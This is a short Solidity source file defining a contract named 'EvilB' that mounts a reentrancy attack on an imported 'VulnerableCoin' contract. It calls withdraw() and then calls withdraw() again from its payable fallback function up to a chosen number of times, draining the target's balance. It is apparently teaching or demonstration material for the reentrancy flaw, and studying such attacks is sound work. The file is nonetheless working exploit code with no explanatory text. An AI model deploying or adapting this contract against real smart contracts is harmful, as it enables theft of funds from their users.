pragma solidity ^0.4.15;

import "./VulnerableCoin.sol";

contract EvilB {

    VulnerableCoin public vulnerableContract;
    uint8 public maxTimes;
    // Start from 1 since first withdraw is done in exit
    uint8 public times = 1;

    function EvilB(address vulnerable) {
        vulnerableContract = VulnerableCoin(vulnerable);
    }

    function exit(uint8 t) {
        maxTimes = t;
        vulnerableContract.withdraw();
    }

    function () payable {
        if (times <= maxTimes) {
            times++;
            vulnerableContract.withdraw();
        }
    }

}
